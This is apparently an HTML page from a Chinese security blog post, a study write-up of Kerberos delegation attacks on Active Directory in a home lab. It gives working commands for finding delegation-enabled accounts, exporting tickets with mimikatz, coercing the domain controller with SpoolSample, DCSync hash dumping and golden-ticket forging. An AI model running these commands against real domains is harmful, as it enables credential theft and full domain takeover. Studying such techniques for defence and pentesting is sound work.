@@ -1,0 +1,583 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/default.png">
+  <link rel="icon" href="/img/default.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="KKfine&#39;s blog">
+  <meta name="keywords" content="">
+  
+  <title>Kerberos协议相关攻击一之委派攻击学习 - KKfine&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/atelier-estuary-light.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>KKfine's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/9.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Kerberos协议相关攻击一之委派攻击学习">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2023-02-18 17:06" pubdate>
+        2023年2月18日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      4k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      45
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Kerberos协议相关攻击一之委派攻击学习</h1>
+            
+            <div class="markdown-body">
+              <h1 id="域渗透-Kerberos协议相关攻击一之委派攻击学习"><a href="#域渗透-Kerberos协议相关攻击一之委派攻击学习" class="headerlink" title="域渗透 Kerberos协议相关攻击一之委派攻击学习"></a>域渗透 Kerberos协议相关攻击一之委派攻击学习</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/c4a956666b67ad0c856a7b3db702d6a4.png" srcset="/img/loading.gif" lazyload></p>
+<p>Kerberos 协议相关知识参考daiker佬的<a target="_blank" rel="noopener" href="https://daiker.gitbook.io/windows-protocol/kerberos">文章</a></p>
+<p>委派攻击可参考<br><a target="_blank" rel="noopener" href="https://www.geekby.site/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/#3-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE">文章1</a><br><a target="_blank" rel="noopener" href="https://blog.zjun.info/tech/kerberos-domain-delegation-attack/">文章2</a><br><a target="_blank" rel="noopener" href="https://www.crisprx.top/archives/429">文章3</a><br>@[toc]</p>
+<h2 id="关于域委派"><a href="#关于域委派" class="headerlink" title="关于域委派"></a>关于域委派</h2><p>首先了解一下什么是委派，委派即委托安排，我把这件事委托给你做了。域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动<br>委派主要分为非约束委派(Unconstrained delegation)和约束委派(Constrained delegation)两个方式，还有一种是基于资源的约束委派（Resource Based Constrained Delegation），这样主要讲解非约束委派攻击。</p>
+<h3 id="域委派的由来"><a href="#域委派的由来" class="headerlink" title="域委派的由来"></a>域委派的由来</h3><p>在Windows 2000 Server首次发布Active Directory时，Microsoft必须提供一种简单的机制来支持用户通过kerberos向web server进行身份验证并需要代表该用户更新后端数据库服务器上的记录的方案。这通常称为”kerberos双跳问题”，并且要求进行委派，以便web server在修改数据库记录时模拟用户。<br>这里说的”以便web server在修改数据库记录时模拟用户” 需要如何理解？<br>我自己理解的是就比如数据库中的相关数据需要修改，如果此时如果是让当前的web server的服务账户去进行修改的话，那么也就无法记录到到底是谁去修改了这个数据，此时如果出了问题就不知道该去问谁了，这种业务情况下就可能就是需要委派这种功能来进行解决，那么委派之后的情况就是，让当前的web server的服务账户去操作，但是web server同样带有客户的信息，在修改相关数据的时候，用的是对应客户操作者的记录。</p>
+<h3 id="为什么域委派"><a href="#为什么域委派" class="headerlink" title="为什么域委派"></a>为什么域委派</h3><p>为什么需要域委派呢，比如现在有web服务器和文件服务器，当用户A访问web服务器去请求某个资源时，web服务器上本身并没有该资源，所以web服务器就会从文件服务器上调用这个资源，其中发生的过程若以域委派的形式进行，那么就是：<br>用户A访问web服务器，服务器再以用户A的身份去访问文件服务器。</p>
+<h3 id="域委派流程"><a href="#域委派流程" class="headerlink" title="域委派流程"></a>域委派流程</h3><p> 一个域内普通用户jack通过Kerberos协议认证到前台WEB服务后，前台运行 WEB服务的服务账号websvc模拟(Impersonate)用户 jack，以Kerberos 协议继续认证到后台服务器，从而在后台服务器中获取jack用户的访问权限，即域中单跳或者多跳的Kerberos认证。——&gt; Kerberos 认证学习<br>流程</p>
+<ul>
+<li>域内用户 jack 以 Kerberos 方式认证后访问 Web 服务器;</li>
+<li>Web服务以websvc服务账号运行，websvc向KDC发起jack用户的票据申请;</li>
+<li>KDC检查websvc用户的委派属性，如果被设置，则返回jack用户的可转发票据 TGT;</li>
+<li>websvc收到jack用户TGT后，使用该票据向KDC申请访问文件服务器的服务票据ST;</li>
+<li>KDC检查websvc的委派属性，如果被设置，且申请的文件服务在允许的列表清单中，则返回一个jack用户访问文件服务的授权票据 ST;</li>
+<li>websvc收到的jack用户的授权票据ST后，可访问文件服务，完成多跳认证。</li>
+</ul>
+<h3 id="委派类型"><a href="#委派类型" class="headerlink" title="委派类型"></a>委派类型</h3><p>委派主要分为以下三种：</p>
+<ul>
+<li>非约束性委派 UD: Unconstrained Delegation</li>
+<li>约束性委派 CD: Constrained Delegation</li>
+<li>基于资源的约束性委派 RBCD: Resource Based Constrained Delegation</li>
+</ul>
+<h3 id="委派原理学习"><a href="#委派原理学习" class="headerlink" title="委派原理学习"></a>委派原理学习</h3><p>非约束性委派的原理是：用户想访问服务A，于是向KDC提交认证，KDC发现A是非约束性委派，会把TGT放在ST中一并给用户。然后用户用这个ST去访问服务A，服务A就相当于获得了用户的TGT，把TGT放入lsass进程，然后就可以拿着用户的TGT以用户的身份去访问该用户权限能够访问的服务了</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/6ef2b3006e3cde799f80041b673ac15a.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li>当服务账号或者主机被设置为非约束性委派时，其userAccountControl属性会包含TRUSTED_FOR_DELEGATION</li>
+<li>当服务账号或者主机被设置为约束性委派时，其userAccountControl属性包含TRUSTED_TO_AUTH_FOR_DELEGATION，且msDS-AllowedToDelegateTo属性会包含被约束的服务</li>
+</ul>
+<h3 id="本地环境"><a href="#本地环境" class="headerlink" title="本地环境"></a>本地环境</h3><p>以下是本地操作环境：</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs crmsh">域：god.org<br>域控：<br>主域控：P-DC 系统：Windows Server <span class="hljs-number">2008</span> R2 IP：<span class="hljs-number">192.168</span>.<span class="hljs-number">52.138</span><br>域内主机：<br>Win-<span class="hljs-number">2003</span> IP：<span class="hljs-number">192.168</span>.<span class="hljs-number">52.141</span> 本地管理员：user<br>Win7     IP: <span class="hljs-number">192.168</span>.<span class="hljs-number">52.143</span> 本地管理员：user<br>域用户：<br>域管：god\administrator<br>普通域用户：god\kkfine<br>配置委派的域用户和服务账号：god\test<br></code></pre></div></td></tr></table></figure>
+<h2 id="非约束性委派"><a href="#非约束性委派" class="headerlink" title="非约束性委派"></a>非约束性委派</h2><h3 id="在域控上配置非约束性委派"><a href="#在域控上配置非约束性委派" class="headerlink" title="在域控上配置非约束性委派"></a>在域控上配置非约束性委派</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/3ebb9cf1518df808d8df13e9e50ec6b7.png" srcset="/img/loading.gif" lazyload></p>
+<p>配置了非约束性委派属性的计算机用户的userAccountControl属性有个 Flag 位WORKSTATION_TRUST_ACCOUNT | TRUSTED_FOR_DELEGATION，其对应的数是0x81000=528384。</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/df194123325b02f31addb2bf613b1261.png" srcset="/img/loading.gif" lazyload></p>
+<p>不过上述是主机账号的委派配置，下面可以看看服务账号的非约束性委派配置，可以先创建一个普通用户 test。<br>但是普通用户默认没有委派的选项设置，需要给他注册一个服务主体名称（SPN）使其成为一个服务账号。SPN(ServicePrincipal Names)服务主体名称，是服务实例(比如：HTTP、SMB、MySQL等服务)的唯一标识符。。SetSPN是一个本地windows二进制文件，可用于检索用户帐户和服务之间的映射。该实用程序可以添加，删除或查看SPN注册。</p>
+<figure class="highlight cmake"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cmake">net user <span class="hljs-keyword">test</span> P@ssw0rd /add /domain<br>setspn -U -A priv/<span class="hljs-keyword">test</span> <span class="hljs-keyword">test</span><br></code></pre></div></td></tr></table></figure>
+
+<p>查询test用户注册的SPN<br><img src="https://img-blog.csdnimg.cn/img_convert/a6dab3d44236bf04d1971324f52daaff.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后同样可以设置非约束性委派了<br><img src="https://img-blog.csdnimg.cn/img_convert/df6df38a1affef87a3bf1b2076229a0e.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="查询非约束性委派的计算机或服务账号"><a href="#查询非约束性委派的计算机或服务账号" class="headerlink" title="查询非约束性委派的计算机或服务账号"></a>查询非约束性委派的计算机或服务账号</h3><p>这里常用 PowerView，Adfind，ldapsearch 这几个工具</p>
+<h4 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h4><p><a target="_blank" rel="noopener" href="https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1">脚本地址</a></p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># 导入 PowerView 脚本</span><br><span class="hljs-built_in">import-module</span> .\powerview.ps1<br><br><span class="hljs-comment"># 查询域内非约束性委派的计算机</span><br><span class="hljs-built_in">Get-NetComputer</span> <span class="hljs-literal">-Unconstrained</span> <span class="hljs-literal">-Domain</span> god.org | <span class="hljs-built_in">select</span> name<br><br><span class="hljs-comment"># 查询域内非约束性委派的服务账号</span><br><span class="hljs-built_in">Get-NetUser</span> <span class="hljs-literal">-Unconstrained</span> <span class="hljs-literal">-Domain</span> god.org | <span class="hljs-built_in">select</span> name<br><br></code></pre></div></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/275a3b5f4e6aac61cc69b717fbfa61c6.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="ldapsearch"><a href="#ldapsearch" class="headerlink" title="ldapsearch"></a>ldapsearch</h4><p>查询域内非约束委派的计算机</p>
+<figure class="highlight perl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs perl">ldapsearch -LLL -<span class="hljs-keyword">x</span> -H ldap:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">52.138</span>:<span class="hljs-number">389</span> -D <span class="hljs-string">&quot;test@god.org&quot;</span> -w <span class="hljs-string">&quot;P@ssw0rd&quot;</span>   -b dc=zjun,dc=com  <span class="hljs-string">&quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> -dn<br><br></code></pre></div></td></tr></table></figure>
+
+<p>查询非约束性委派的服务账号</p>
+<figure class="highlight perl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs perl">ldapsearch -LLL -<span class="hljs-keyword">x</span> -H ldap:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">52.138</span>:<span class="hljs-number">389</span> -D <span class="hljs-string">&quot;test@god.org&quot;</span> -w <span class="hljs-string">&quot;P@ssw0rd&quot;</span>   -b dc=zjun,dc=com  <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> cn distinguishedName<br><br></code></pre></div></td></tr></table></figure>
+
+<h4 id="Adfind"><a href="#Adfind" class="headerlink" title="Adfind"></a>Adfind</h4><figure class="highlight armasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs armasm"><span class="hljs-comment"># 查询域内非约束性委派的计算机</span><br><span class="hljs-symbol">AdFind.exe</span> -<span class="hljs-keyword">b</span> <span class="hljs-string">&quot;DC=zjun,DC=com&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> -<span class="hljs-meta">dn</span><br><br><span class="hljs-comment"># 查询非约束性委派的服务账号</span><br><span class="hljs-symbol">AdFind.exe</span> -<span class="hljs-keyword">b</span> <span class="hljs-string">&quot;DC=zjun,DC=com&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> -<span class="hljs-meta">dn</span><br><br></code></pre></div></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/edd48b70c7d79f9769692d7c12907198.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="非约束性委派攻击"><a href="#非约束性委派攻击" class="headerlink" title="非约束性委派攻击"></a>非约束性委派攻击</h3><p>用户 user 去访问服务 service，如果服务 service 的服务账户开启了非约束性委派，那么当用户 user 访问服务 service 的时候会将用户 user 的 TGT 发送给服务 service 并保存在内存中以备下次重用，所以服务 service 能够利用用户 user 的身份去访问用户 user 能够访问的任意服务。</p>
+<p>两种攻击方式，一种是诱使域管用户（相当于是域内钓鱼）来访问配置了非约束性委派的主机或服务，二是结合打印机漏洞让域管用户强制回连以缓存 TGT。</p>
+<h4 id="模拟域管访问非约束性委派主机"><a href="#模拟域管访问非约束性委派主机" class="headerlink" title="模拟域管访问非约束性委派主机"></a>模拟域管访问非约束性委派主机</h4><p>这里直接模拟域管用户god/Administrator（只要是域管用户，不一定在域管）访问被非约束性委派的主机stu1，stu1 已获得本地管理员权限。常见可利用钓鱼的连接方式可以是 MSSQL 或 IIS，这里演示域管用户 stu1/Administrator 直接 IPC 连接 stu1 。</p>
+<p>最开始肯定是无法访问域控的<br><img src="https://img-blog.csdnimg.cn/img_convert/7843a6e88e14141724deaf0e739d420b.png" srcset="/img/loading.gif" lazyload></p>
+<p>域管用户 god/Administrator IPC 连接 stu1<br><img src="https://img-blog.csdnimg.cn/img_convert/5282875167310b3dd5621644b588ccb7.png" srcset="/img/loading.gif" lazyload></p>
+<p>这时stu1机器就已经有了域管 god/Administrator 的 TGT 票据，可以用 mimikatz 导出</p>
+<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta"># mimikatz</span><br>privilege::debug<br>sekurlsa::tickets /<span class="hljs-keyword">export</span><br>kerberos::ptt xxx.kirbi<br></code></pre></div></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/3790740261e6607631bc78e706bbda61.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="非约束性委派-Spooler-打印机服务漏洞"><a href="#非约束性委派-Spooler-打印机服务漏洞" class="headerlink" title="非约束性委派 +Spooler 打印机服务漏洞"></a>非约束性委派 +Spooler 打印机服务漏洞</h4><p>在实战中，只是单纯的非约束委派话需要管理员主动连接比较鸡肋。因此可以利用非约束委派 + Spooler打印机服务可以强制指定的主机进行连接。但是这种方法也需要控制一个域用户。</p>
+<p>利用 Windows 打印系统远程协议（MS-RPRN）中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用 MS-RPRN RpcRemoteFindFirstPrinterChangeNotification(Ex) 方法强制任何运行了 Spooler 服务的计算机以通过 Kerberos 或 NTLM 对攻击者选择的目标进行身份验证。</p>
+<p>非约束性委派主机结合 Spooler 打印机服务漏洞，让域控机器 P-DC 强制访问已控的具有本地管理员权限的非约束性委派机器 Win-2008 ，从而拿到域管理员的 TGT，进而接管域控。</p>
+<blockquote>
+<p>splooer服务是默认运行的<br><img src="https://img-blog.csdnimg.cn/img_convert/5b070fda2cc80ccfdffe66541ee344bf.png" srcset="/img/loading.gif" lazyload></p>
+</blockquote>
+<p>首先利用Rubeus在 Win-2008 上以本地管理员权限执行以下命令，每隔一秒监听来自域控机器 P-DC 的登录信息。<br><img src="https://img-blog.csdnimg.cn/img_convert/11232f98ef4536b5b99bbed6ce2aaeb1.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight smali"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs smali">Rubeus.exe<span class="hljs-built_in"> monitor </span>/interval:1 /filteruser:OWA$<br><br></code></pre></div></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/00da8c2bc98b6a4d28090babcb7ef2cf.png" srcset="/img/loading.gif" lazyload></p>
+<p>再利用SpoolSample强制域控打印机回连，需在域用户进程上执行，所以这里切换成了普通域用户帐号去执行</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SpoolSample</span>.</span></span>exe OWA STU1<br></code></pre></div></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/f3b7dcfbbc37528d55cdd5e68ca4c772.png" srcset="/img/loading.gif" lazyload></p>
+<p>但最终我本地没有成功，大概率是由于.net framework框架版本较低所以使用不成功。用一下网上的图<br><img src="https://img-blog.csdnimg.cn/img_convert/492198936147c197c8dd37e1c3cd2d93.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后就能用rebeus导入tgt票据了</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Rubeus</span>.</span></span>exe ptt /ticket:Base64EncodedTicket<br></code></pre></div></td></tr></table></figure>
+<p>然后这个时候其实就可以导出所有用户的ntlm hash了，并且内存中也有了域管的 TGT 也可以直接 PTT。</p>
+<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">lsadump::dcsync <span class="hljs-regexp">/all /</span>csv<br></code></pre></div></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/a31a1811b6e6597b7bfa83c77c820cf8.png" srcset="/img/loading.gif" lazyload></p>
+<p>获取krbtgt的hash和sid</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">lsadump:</span>:dcsync /domain:god<span class="hljs-meta">.org</span> /user:krbtgt<br></code></pre></div></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/c139df3a7a7dee6b31349830f285ea77.png" srcset="/img/loading.gif" lazyload></p>
+<p>接下来解密 NTLM hash 后可以直接登录域控，解不开也可以利用 krbtgt 的 NTLM hash 用于做黄金票据权限维持。参考<a target="_blank" rel="noopener" href="https://blog.zjun.info/tech/kerberos-protocol-to-ticket-forgery/">文章</a></p>
+<p>制造黄金票据</p>
+<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">kerberos</span>::golden /user:Administrator /domain:god.org /sid:s-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">2952760202</span>-<span class="hljs-number">1353902439</span>-<span class="hljs-number">2381784089</span> /krbtgt:<span class="hljs-number">58</span>e<span class="hljs-number">91</span>a<span class="hljs-number">5</span>ac<span class="hljs-number">358</span>d<span class="hljs-number">86513</span>ab<span class="hljs-number">224312314061</span> /ptt<br></code></pre></div></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/08eb8e3046ce1162bed77c7c2347947f.png" srcset="/img/loading.gif" lazyload></p>
+<p>最后可以通过<code>Enter-PSSession -ComputerName OWA</code>开启远程会话。</p>
+<h2 id="约束性委派"><a href="#约束性委派" class="headerlink" title="约束性委派"></a>约束性委派</h2><blockquote>
+<p>由于非约束性委派的不安全性，微软在 Windows Server 2003 中引入了约束委派。区别在于不会直接把 TGT 给服务，所发送的认证信息中包含了允许访问的服务，即不允许服务代表用户去访问其他服务。同时为了在 Kerberos 协议层面对约束性委派的支持， 微软扩展了两个子协议：</p>
+<ul>
+<li>S4U2Self Service for User to Self</li>
+<li>S4U2Proxy Service for User to Proxy</li>
+</ul>
+<p>S4U2Self 可以代表自身请求针对其自身的 Kerberos 服务票据 ST ， S4U2Proxy 可以用上一步获得的可转发 ST 服务票据以用户的名义请求针对其他指定服务的 ST 服务票据。<br>对于约束性委派，服务账号只能获取该用户的 ST 服务票据，从而只能模拟该用户访问特定的服务。配置了约束性委派账户的 msDS- AllowedToDelegateTo 属性会指定对哪个 SPN 进行委派。约束性委派的设置需要 SeEnableDelegationPrivilege 权限，该特权通常只有域管理员才有。</p>
+</blockquote>
+<p>配置约束性委派同上。下面设置了服务主机stu1的约束性委派，协议为域控owa的 cifs 协议。关于cifs可以参见<a target="_blank" rel="noopener" href="https://juejin.cn/post/6974591359889965086">文章</a></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/aa7e2f3be4892a386787c4dbaa71836e.png" srcset="/img/loading.gif" lazyload></p>
+<p>配置了支持使用任何身份验证协议的约束性委派后，在机器账号的userAccountControl属性有个 FLAG 位 WORKSTATION_TRUST_ACCOUNT | TRUETED_TO_AUTHENTICATE_FOR_DELEGATION，其对应的数是0x1001000=16781312。并且其msDS-AllowedToDelegateTo属性会有允许被委派的服务的 SPN。<br><img src="https://img-blog.csdnimg.cn/img_convert/65d2c52218c8c8a1943b51c74d58f24e.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/001e20d86ea1522cb1399dcf472c71bd.png" srcset="/img/loading.gif" lazyload></p>
+<p>如果仅用 Kerberos 协议进行身份验证，不支持协议转换。置了仅使用 Kerberos(K) 约束性委派的机器账号和服务账号的 userAccountControl 属性与正常账号一样，同样其 msDS- AllowedToDelegateTo 属性会有允许被委派的服务的 SPN。</p>
+<p>约束性委派用户或者机器的域内查找同非约束性是一样的。</p>
+<h3 id="约束性委派攻击"><a href="#约束性委派攻击" class="headerlink" title="约束性委派攻击"></a>约束性委派攻击</h3><p>在约束性委派中，服务用户只能获取到某个主机或者用户的ST，所以只能模拟特定的用户身份访问特定的服务，是无法获取到用户的TGT的。但是如果我们能获取到开启了约束委派的服务用户的明文密码或者NTLM HASH，就可以伪造S4U请求，进而伪装成服务用户以任意账户的权限申请访问指定服务的ST。</p>
+<p>我们的目的仍然是需要先获取到用户的TGT，这里假设有两种情况一种是知道了服务账户的用户密码，另一种是开启了约束委派的主机账户的用户密码。<br>如果知道服务账户的用户密码，例如这里的test账户。</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">tgt:<span class="hljs-function">:ask</span> <span class="hljs-string">/user</span><span class="hljs-function">:Test</span> <span class="hljs-string">/domain</span><span class="hljs-function">:god.org</span> <span class="hljs-string">/password</span><span class="hljs-function">:P</span>@ssW0rd<br></code></pre></div></td></tr></table></figure>
